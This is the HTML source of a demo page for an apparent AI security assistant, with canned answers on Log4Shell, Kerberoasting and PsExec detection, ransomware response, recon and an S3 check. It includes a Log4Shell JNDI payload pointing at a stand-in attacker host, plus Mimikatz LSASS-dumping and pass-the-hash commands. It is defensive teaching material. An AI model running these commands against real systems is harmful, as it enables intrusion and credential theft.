<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Live Demo â€” Hancock by CyberViser</title>
  <meta name="description" content="Try Hancock live â€” AI-powered pentest and SOC assistant. Ask it anything about cybersecurity." />
  <link rel="canonical" href="https://cyberviser.ai/demo" />
  <meta property="og:title"       content="Hancock Demo â€” Try the AI Security Agent" />
  <meta property="og:description" content="Ask Hancock about CVEs, SIEM queries, threat hunting, IR playbooks. Live demo." />
  <meta property="og:url"         content="https://cyberviser.ai/demo" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
      --green:  #00ff88;
      --cyan:   #00e5ff;
      --red:    #ff3366;
      --dark:   #080c10;
      --card:   #0d1117;
      --border: #1a2332;
      --text:   #c9d1d9;
      --muted:  #586069;
    }
    body { background: var(--dark); color: var(--text); font-family: 'Courier New', monospace; min-height: 100vh; display: flex; flex-direction: column; }

    /* â”€â”€ Nav â”€â”€ */
    nav { display: flex; justify-content: space-between; align-items: center; padding: 1.2rem 2rem; border-bottom: 1px solid var(--border); position: sticky; top: 0; background: rgba(8,12,16,.95); backdrop-filter: blur(10px); z-index: 100; }
    .nav-logo { font-size: 1.2rem; font-weight: 700; color: var(--green); text-decoration: none; letter-spacing: 2px; }
    .nav-logo span { color: var(--cyan); }
    .nav-links { display: flex; gap: 1.5rem; list-style: none; }
    .nav-links a { color: var(--muted); text-decoration: none; font-size: .85rem; transition: color .2s; }
    .nav-links a:hover { color: var(--green); }
    .nav-cta { background: var(--green) !important; color: var(--dark) !important; padding: .4rem 1rem; border-radius: 4px; font-weight: 700; }

    /* â”€â”€ Hero â”€â”€ */
    .hero { text-align: center; padding: 3rem 2rem 1.5rem; }
    .hero h1 { font-size: 2rem; color: var(--green); margin-bottom: .5rem; }
    .hero p { color: var(--muted); font-size: .95rem; max-width: 560px; margin: 0 auto 1rem; }
    .badge { display: inline-block; background: rgba(0,255,136,.1); border: 1px solid var(--green); color: var(--green); font-size: .75rem; padding: .2rem .7rem; border-radius: 20px; margin-bottom: 1rem; }

    /* â”€â”€ Suggestions â”€â”€ */
    .suggestions { display: flex; flex-wrap: wrap; gap: .5rem; justify-content: center; padding: 0 2rem 1.5rem; max-width: 900px; margin: 0 auto; }
    .suggestion { background: var(--card); border: 1px solid var(--border); color: var(--cyan); font-family: inherit; font-size: .78rem; padding: .4rem .9rem; border-radius: 20px; cursor: pointer; transition: all .2s; }
    .suggestion:hover { border-color: var(--cyan); background: rgba(0,229,255,.08); }

    /* â”€â”€ Terminal â”€â”€ */
    .terminal-wrap { flex: 1; max-width: 900px; width: 100%; margin: 0 auto; padding: 0 1.5rem 2rem; }
    .terminal { background: var(--card); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
    .term-header { background: #161b22; padding: .6rem 1rem; display: flex; align-items: center; gap: .5rem; border-bottom: 1px solid var(--border); }
    .dot { width: 12px; height: 12px; border-radius: 50%; }
    .dot.r { background: #ff5f57; }
    .dot.y { background: #ffbd2e; }
    .dot.g { background: #28c840; }
    .term-title { color: var(--muted); font-size: .8rem; margin-left: .5rem; }
    .term-body { padding: 1.2rem; min-height: 380px; max-height: 500px; overflow-y: auto; scroll-behavior: smooth; }
    .line { margin-bottom: .6rem; line-height: 1.6; font-size: .88rem; white-space: pre-wrap; word-break: break-word; }
    .line.prompt  { color: var(--green); }
    .line.user    { color: var(--cyan); }
    .line.response{ color: var(--text); }
    .line.system  { color: var(--muted); font-style: italic; }
    .line.error   { color: var(--red); }
    .cursor { display: inline-block; width: 8px; height: 14px; background: var(--green); animation: blink 1s step-end infinite; vertical-align: middle; }
    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
    .typing-indicator { color: var(--muted); font-size: .8rem; }

    /* â”€â”€ Input bar â”€â”€ */
    .input-bar { display: flex; align-items: center; gap: .5rem; padding: .8rem 1.2rem; border-top: 1px solid var(--border); background: #0d1117; }
    .prompt-sym { color: var(--green); font-size: 1rem; flex-shrink: 0; }
    #userInput { flex: 1; background: transparent; border: none; outline: none; color: var(--text); font-family: inherit; font-size: .9rem; caret-color: var(--green); }
    #sendBtn { background: var(--green); color: var(--dark); border: none; padding: .4rem .9rem; border-radius: 4px; font-family: inherit; font-size: .8rem; font-weight: 700; cursor: pointer; transition: background .2s; }
    #sendBtn:hover { background: #00cc6e; }
    #sendBtn:disabled { opacity: .5; cursor: not-allowed; }

    /* â”€â”€ CTA strip â”€â”€ */
    .cta-strip { text-align: center; padding: 1.5rem; border-top: 1px solid var(--border); background: #0a0f14; }
    .cta-strip p { color: var(--muted); font-size: .85rem; margin-bottom: .8rem; }
    .api-config { display: flex; flex-wrap: wrap; gap: .5rem; justify-content: center; margin-bottom: .8rem; }
    .api-config input { background: var(--card); border: 1px solid var(--border); color: var(--text); font-family: inherit; font-size: .8rem; padding: .4rem .8rem; border-radius: 4px; width: 220px; outline: none; }
    .api-config input:focus { border-color: var(--cyan); }
    .api-config button { background: var(--cyan); color: var(--dark); border: none; padding: .4rem .9rem; border-radius: 4px; font-family: inherit; font-size: .8rem; font-weight: 700; cursor: pointer; }
    #configStatus { font-size: .8rem; align-self: center; }
    .status-live   { color: var(--green); }
    .status-off    { color: var(--muted); }
    .status-err    { color: var(--red); }
    .live-badge { display:none; background:rgba(0,255,136,.1); border:1px solid var(--green); color:var(--green); font-size:.7rem; padding:.15rem .6rem; border-radius:20px; margin-left:.6rem; vertical-align:middle; }
    .btn { display: inline-block; padding: .5rem 1.4rem; border-radius: 4px; font-family: inherit; font-size: .85rem; font-weight: 700; text-decoration: none; margin: 0 .4rem; }
    .btn-primary { background: var(--green); color: var(--dark); }
    .btn-outline  { border: 1px solid var(--green); color: var(--green); }
    .btn:hover { opacity: .85; }

    @media(max-width:600px) { .nav-links { display: none; } .hero h1 { font-size: 1.4rem; } }
  </style>
</head>
<body>

<nav>
  <a href="/" class="nav-logo">CYBER<span>VISER</span></a>
  <ul class="nav-links">
    <li><a href="/">Home</a></li>
    <li><a href="api.html">API Docs</a></li>
    <li><a href="enterprise.html">Enterprise</a></li>
    <li><a href="pricing.html">Pricing</a></li>
    <li><a href="sponsors.html">Sponsors</a></li>
    <li><a href="contact.html" class="nav-cta">Get Access â†—</a></li>
  </ul>
</nav>

<div class="hero">
  <div class="badge">â–¶ INTERACTIVE DEMO â€” NO SIGNUP REQUIRED</div>
  <h1>// try hancock</h1>
  <p>Ask the AI anything about cybersecurity. Pentest techniques, SOC triage, SIEM queries, CVEs, IR playbooks.</p>
</div>

<div class="suggestions">
  <button class="suggestion" onclick="ask('Triage a high-severity alert: PowerShell with encoded command spawned from Word.exe')">ğŸ”´ Triage PS alert</button>
  <button class="suggestion" onclick="ask('Write a Splunk query to detect Kerberoasting')">ğŸ”µ Kerberoast SPL query</button>
  <button class="suggestion" onclick="ask('What is CVE-2021-44228 and how do I detect it?')">âš¡ Log4Shell CVE</button>
  <button class="suggestion" onclick="ask('Write a PICERL playbook for a ransomware incident')">ğŸš¨ Ransomware playbook</button>
  <button class="suggestion" onclick="ask('What recon techniques should I use at the start of a pentest?')">ğŸ” Pentest recon</button>
  <button class="suggestion" onclick="ask('How do I detect lateral movement with PsExec in Elastic?')">ğŸ” Lateral movement hunt</button>
  <button class="suggestion" onclick="ask('Explain Pass-the-Hash and how to defend against it')">ğŸ”‘ Pass-the-Hash</button>
  <button class="suggestion" onclick="ask('Write a Python script to check for open S3 buckets')">ğŸª£ S3 bucket check</button>
</div>

<div class="terminal-wrap">
  <div class="terminal">
    <div class="term-header">
      <div class="dot r"></div><div class="dot y"></div><div class="dot g"></div>
      <span class="term-title">hancock@cyberviser:~$ â€” demo mode</span>
      <span class="live-badge" id="liveBadge">â— LIVE</span>
    </div>
    <div class="term-body" id="termBody">
      <div class="line system">Hancock v0.5.0 â€” CyberViser AI Security Platform</div>
      <div class="line system">Modes: pentest | soc | auto | code | ciso | sigma | yara | ioc</div>
      <div class="line system">Type a question or click a suggestion above.</div>
      <div class="line system">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    </div>
    <div class="input-bar">
      <span class="prompt-sym">â¯</span>
      <input id="userInput" type="text" placeholder="Ask Hancock anything..." autocomplete="off" />
      <button id="sendBtn" onclick="submitQuery()">Send â†µ</button>
    </div>
  </div>
</div>

<div class="cta-strip">
  <p>This demo uses pre-loaded responses. Point it at your own Hancock instance for live AI:</p>
  <div class="api-config" id="apiConfig">
    <input id="apiUrl"   type="text"     placeholder="http://localhost:5000" value="" />
    <input id="apiKey"   type="password" placeholder="HANCOCK_API_KEY (optional)" value="" />
    <button onclick="saveConfig()">Connect â†µ</button>
    <span id="configStatus"></span>
  </div>
  <div style="margin-top:.8rem">
    <a href="pricing.html" class="btn btn-primary">âš¡ Get Full Access</a>
    <a href="https://github.com/cyberviser/Hancock" target="_blank" class="btn btn-outline">Self-Host Free</a>
  </div>
</div>

<script>
// â”€â”€ Demo knowledge base â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const KB = [
  {
    keys: ['log4shell','log4j','cve-2021-44228','44228'],
    response: `CVE-2021-44228 â€” Log4Shell (CVSS 10.0)

Affected: Apache Log4j 2.0-beta9 through 2.14.1
Type: Remote Code Execution via JNDI lookup injection

ATTACK CHAIN:
  1. Attacker sends \${jndi:ldap://attacker.com/exploit} in any logged field
     (User-Agent, X-Forwarded-For, login username, etc.)
  2. Log4j processes the JNDI lookup, connects to attacker's LDAP server
  3. LDAP responds with reference to malicious Java class
  4. JVM loads and executes the class â†’ RCE as service account

DETECTION (Splunk):
  index=web_logs (http_user_agent="*jndi*" OR uri="*jndi*" OR post_data="*jndi*")
  | rex field=_raw "(?<jndi_payload>\\\$\\\{jndi:[^\\\}]+\\\})"
  | table _time, src_ip, dest_host, jndi_payload

MITRE: T1190 (Exploit Public-Facing Application)

FIX: Upgrade to Log4j 2.17.1+. Patch now â€” this is weaponized in the wild.`
  },
  {
    keys: ['kerberoast','kerberoasting','splunk','spl','spn'],
    response: `Kerberoasting Detection â€” Splunk SPL

Attack: Attacker requests TGS tickets for SPN accounts, cracks hashes offline.
MITRE: T1558.003

SPLUNK QUERY:
\`\`\`spl
index=wineventlog EventCode=4769
  Ticket_Encryption_Type=0x17
| eval hour = strftime(_time, "%H")
| where (hour < 7 OR hour > 19)
| stats
    count as ticket_requests,
    dc(ServiceName) as unique_services,
    values(ServiceName) as services
  by Account_Name, Client_Address
| where ticket_requests > 3 OR unique_services > 3
| sort -ticket_requests
\`\`\`

KEY SIGNALS:
  â†’ Encryption type 0x17 = RC4 (weak, crackable)
  â†’ Multiple SPN requests from one account = recon
  â†’ Off-hours activity = high suspicion

CONTAINMENT: Reset passwords on targeted service accounts immediately.
HARDEN: Set msDS-SupportedEncryptionTypes = 24 (AES only) on all SPNs.`
  },
  {
    keys: ['ransomware','picerl','playbook','incident response','ir'],
    response: `PICERL Playbook â€” Ransomware Incident

P â€” PREPARATION
  â€¢ Isolate affected systems from network immediately (pull cable / disable NIC)
  â€¢ Activate IR team + notify legal, executive leadership
  â€¢ Document everything with timestamps

I â€” IDENTIFICATION
  â€¢ Identify ransomware family (check ransom note, file extension, ID Ransomware)
  â€¢ Scope: how many systems? Which BUs affected?
  â€¢ Preserve: memory dumps, disk images, logs BEFORE cleanup

C â€” CONTAINMENT
  â€¢ Short-term: isolate all infected hosts (VLAN quarantine or full isolation)
  â€¢ Long-term: identify and block C2 IPs/domains at firewall/proxy
  â€¢ Disable compromised accounts

E â€” ERADICATION
  â€¢ Identify patient zero and initial access vector
  â€¢ Remove all malware artifacts, persistence mechanisms (scheduled tasks, registry)
  â€¢ Patch the exploited vulnerability

R â€” RECOVERY
  â€¢ Restore from clean backups (verify integrity first)
  â€¢ Rebuild compromised systems from known-good images
  â€¢ Reset all credentials (assume full domain compromise)
  â€¢ Monitor for re-infection 30 days post-recovery

L â€” LESSONS LEARNED
  â€¢ Timeline of attack, dwell time, detection gap
  â€¢ Control failures identified
  â€¢ Policy/process changes required

NEVER pay the ransom without legal/executive consultation.`
  },
  {
    keys: ['powershell','encoded','word.exe','triage','alert','high-severity'],
    response: `SOC TRIAGE REPORT

ALERT: PowerShell with encoded command spawned from Word.exe
SEVERITY: ğŸ”´ CRITICAL
VERDICT: TRUE POSITIVE â€” Malicious macro execution

MITRE ATT&CK:
  T1566.001 â€” Spearphishing Attachment (Initial Access)
  T1059.001 â€” PowerShell (Execution)
  T1027     â€” Obfuscated Files or Information

ANALYSIS:
  Word.exe â†’ PowerShell.exe with -EncodedCommand is a classic
  malicious macro pattern (Emotet, Qakbot, BazarLoader).
  The encoding is used to bypass command-line logging.

IMMEDIATE ACTIONS (next 15 minutes):
  1. Isolate the endpoint from the network NOW
  2. Terminate the PowerShell process
  3. Decode the base64 payload:
     [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<payload>'))
  4. Block parent process hash at EDR
  5. Check for lateral movement from same src_ip in last 2 hours

HUNT QUERY (Splunk):
  index=wineventlog EventCode=4688
  | where ParentProcessName like "%winword%"
    AND NewProcessName like "%powershell%"
    AND CommandLine like "%-EncodedCommand%"
  | table _time, host, user, CommandLine`
  },
  {
    keys: ['recon','reconnaissance','pentest','penetration test','nmap','osint'],
    response: `Pentest Recon Methodology (PTES)

PHASE 1 â€” PASSIVE RECON (no direct contact)
  â€¢ OSINT: theHarvester, Maltego, Shodan, Censys
  â€¢ DNS: subfinder, amass, dnsx
    subfinder -d target.com -silent | httpx -silent
  â€¢ Google Dorks:
    site:target.com filetype:pdf "confidential"
    site:target.com inurl:admin
  â€¢ Certificate Transparency: crt.sh/?q=%.target.com

PHASE 2 â€” ACTIVE RECON
  â€¢ Host discovery:
    nmap -sn 10.0.0.0/24 -oG hosts.txt
  â€¢ Port scan (full + version + scripts):
    nmap -sV -sC -p- --min-rate 3000 -oA full_scan <target>
  â€¢ Web tech fingerprint:
    whatweb https://target.com
    nuclei -u https://target.com -t technologies/

PHASE 3 â€” SERVICE ENUMERATION
  â€¢ Web: nikto, gobuster (dir + vhost), ffuf
  â€¢ SMB: enum4linux-ng, crackmapexec smb
  â€¢ LDAP: ldapdomaindump (if domain-joined)

REMEMBER: Get written authorization before ANY active recon.`
  },
  {
    keys: ['lateral movement','psexec','elastic','detection','hunt'],
    response: `Lateral Movement Detection â€” Elastic KQL

Attack: PsExec / remote service creation for lateral movement
MITRE: T1570 (Lateral Tool Transfer), T1021.002 (SMB/Windows Admin Shares)

ELASTIC KQL QUERY:
\`\`\`kql
event.category: "process" AND
event.type: "start" AND
(
  process.name: ("psexec.exe" OR "psexesvc.exe") OR
  (process.parent.name: "services.exe" AND
   process.name: ("cmd.exe" OR "powershell.exe") AND
   process.command_line: (*ADMIN$* OR *IPC$*))
) AND
NOT process.executable: "C:\\\\Windows\\\\System32\\\\*"
\`\`\`

ADDITIONAL SIGNALS:
  â€¢ Event ID 7045: New service installed (PSEXESVC)
  â€¢ Event ID 4624 Type 3: Network logon from internal IP
  â€¢ Event ID 5145: Network share object access (ADMIN$)

SPLUNK EQUIVALENT:
  index=wineventlog (EventCode=7045 ServiceName="PSEXESVC")
  | join host [search index=wineventlog EventCode=4624 Logon_Type=3]
  | table _time, host, src_ip, user, ServiceFileName`
  },
  {
    keys: ['pass-the-hash','pth','ntlm','credential','hash'],
    response: `Pass-the-Hash (PtH) â€” Attack & Defense

ATTACK:
  Attacker captures NTLM hash (Mimikatz, secretsdump) and authenticates
  without cracking the plaintext password.

  # Mimikatz â€” dump hashes from LSASS
  privilege::debug
  sekurlsa::logonpasswords

  # Use hash for lateral movement
  impacket-psexec -hashes :NTLMhash administrator@10.0.0.5
  evil-winrm -i 10.0.0.5 -u administrator -H NTLMhash

DETECTION:
  EventCode 4624, Logon_Type=3 (network) with NtLmSsp auth
  where the source IP doesn't match expected admin workstations.

  Splunk:
  index=wineventlog EventCode=4624 Logon_Type=3
    Authentication_Package=NTLM
  | stats count by src_ip, Account_Name, Workstation_Name
  | where count > 5

DEFENSES:
  âœ“ Enable Protected Users security group (blocks NTLM auth for privileged accounts)
  âœ“ Enable Credential Guard (isolates LSASS in VSM)
  âœ“ Tiered admin model â€” admin accounts don't log into workstations
  âœ“ LAPS â€” unique local admin passwords per machine`
  },
  {
    keys: ['s3','bucket','python','boto3','open','public','aws'],
    response: `S3 Bucket Enumeration Script (Python)

\`\`\`python
#!/usr/bin/env python3
"""Check S3 buckets for public access. AUTHORIZED USE ONLY."""
import boto3
import json
from botocore.exceptions import ClientError

def check_bucket_acl(s3, bucket_name):
    try:
        acl = s3.get_bucket_acl(Bucket=bucket_name)
        for grant in acl['Grants']:
            grantee = grant.get('Grantee', {})
            if grantee.get('URI') == 'http://acs.amazonaws.com/groups/global/AllUsers':
                return f"âš ï¸  PUBLIC: {grant['Permission']}"
        return "âœ“ Private"
    except ClientError as e:
        return f"Error: {e.response['Error']['Code']}"

def check_public_access_block(s3, bucket_name):
    try:
        resp = s3.get_public_access_block(Bucket=bucket_name)
        cfg = resp['PublicAccessBlockConfiguration']
        if all(cfg.values()):
            return "âœ“ Block All Public Access: ON"
        return f"âš ï¸  Block Public Access: PARTIAL â€” {cfg}"
    except ClientError:
        return "âš ï¸  No Public Access Block configured"

s3 = boto3.client('s3')
buckets = s3.list_buckets()['Buckets']
for b in buckets:
    name = b['Name']
    acl_status = check_bucket_acl(s3, name)
    pab_status = check_public_access_block(s3, name)
    print(f"Bucket: {name}")
    print(f"  ACL: {acl_status}")
    print(f"  PAB: {pab_status}\\n")
\`\`\`

Run: pip install boto3 && AWS_PROFILE=your-profile python3 s3_check.py`
  }
];

function getResponse(query) {
  const q = query.toLowerCase();
  for (const entry of KB) {
    if (entry.keys.some(k => q.includes(k))) return entry.response;
  }
  return `Hancock received: "${query}"

This demo contains pre-loaded responses for common security topics.

In full deployment (with your NVIDIA API key), Hancock would answer this
with live inference from a fine-tuned Mistral 7B model trained on:
  â€¢ MITRE ATT&CK framework (all techniques)
  â€¢ NVD/CVE database (200k+ vulnerabilities)
  â€¢ Pentest methodology (PTES, OWASP)
  â€¢ SOC playbooks and SIEM queries

Try one of the suggested topics, or:
â†’ https://cyberviser.ai/pricing  to get full API access
â†’ https://github.com/cyberviser/Hancock   to self-host`;
}

// â”€â”€ Live API config â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
let liveUrl = localStorage.getItem('hancock_url') || '';
let liveKey = localStorage.getItem('hancock_key') || '';

function saveConfig() {
  liveUrl = document.getElementById('apiUrl').value.trim().replace(/\/$/, '');
  liveKey = document.getElementById('apiKey').value.trim();
  if (!liveUrl) { setStatus('Enter a Hancock server URL', 'status-err'); return; }
  localStorage.setItem('hancock_url', liveUrl);
  localStorage.setItem('hancock_key', liveKey);
  testConnection();
}

async function testConnection() {
  setStatus('Connecting...', 'status-off');
  try {
    const res = await fetch(liveUrl + '/health', { signal: AbortSignal.timeout(4000) });
    if (res.ok) {
      const d = await res.json();
      setStatus('â— Live: ' + (d.model || 'connected'), 'status-live');
      document.getElementById('liveBadge').style.display = 'inline-block';
      addLine('[connected] Live Hancock at ' + liveUrl, 'system');
    } else {
      setStatus('Server returned ' + res.status, 'status-err');
    }
  } catch(e) {
    setStatus('Could not reach server â€” using pre-loaded responses', 'status-err');
    document.getElementById('liveBadge').style.display = 'none';
  }
}

function setStatus(msg, cls) {
  const el = document.getElementById('configStatus');
  el.textContent = msg;
  el.className = cls;
}

// Restore saved config on load
if (liveUrl) {
  document.getElementById('apiUrl').value = liveUrl;
  document.getElementById('apiKey').value = liveKey;
  testConnection();
}

async function liveAsk(question) {
  const headers = { 'Content-Type': 'application/json' };
  if (liveKey) headers['Authorization'] = 'Bearer ' + liveKey;
  const res = await fetch(liveUrl + '/v1/ask', {
    method: 'POST',
    headers,
    body: JSON.stringify({ question, mode: 'auto' }),
    signal: AbortSignal.timeout(30000),
  });
  if (!res.ok) throw new Error('HTTP ' + res.status);
  const d = await res.json();
  return d.answer || d.response || JSON.stringify(d);
}

// â”€â”€ Terminal UI â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const body  = document.getElementById('termBody');
const input = document.getElementById('userInput');
const btn   = document.getElementById('sendBtn');

function addLine(text, cls) {
  const div = document.createElement('div');
  div.className = 'line ' + cls;
  div.textContent = text;
  body.appendChild(div);
  body.scrollTop = body.scrollHeight;
  return div;
}

function typeText(el, text, speed = 4) {
  return new Promise(resolve => {
    let i = 0;
    const tick = () => {
      if (i < text.length) {
        el.textContent += text[i++];
        body.scrollTop = body.scrollHeight;
        setTimeout(tick, speed);
      } else { resolve(); }
    };
    tick();
  });
}

async function submitQuery() {
  const q = input.value.trim();
  if (!q) return;
  input.value = '';
  btn.disabled = true;

  addLine('â¯ ' + q, 'user');

  const thinking = addLine('hancock@cyberviser:~$ â–‹', 'prompt typing-indicator');

  let answer;
  if (liveUrl && document.getElementById('configStatus').className === 'status-live') {
    // â”€â”€ Live API path â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    try {
      answer = await liveAsk(q);
    } catch(e) {
      answer = '[API error: ' + e.message + ']\nFalling back to pre-loaded response:\n\n' + getResponse(q);
    }
  } else {
    // â”€â”€ Pre-loaded fallback â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    await new Promise(r => setTimeout(r, 600 + Math.random() * 600));
    answer = getResponse(q);
  }

  thinking.remove();
  const respEl = addLine('', 'response');
  await typeText(respEl, answer);
  addLine('', 'system');

  btn.disabled = false;
  input.focus();
}

function ask(q) { input.value = q; submitQuery(); }
input.addEventListener('keydown', e => { if (e.key === 'Enter') submitQuery(); });

// Welcome cursor
const welcome = addLine('', 'prompt');
welcome.innerHTML = 'â¯ <span class="cursor"></span>';
setTimeout(() => {
  welcome.remove();
  addLine('â¯ Ready. Ask me anything.', 'prompt');
}, 1200);
</script>
</body>
</html>
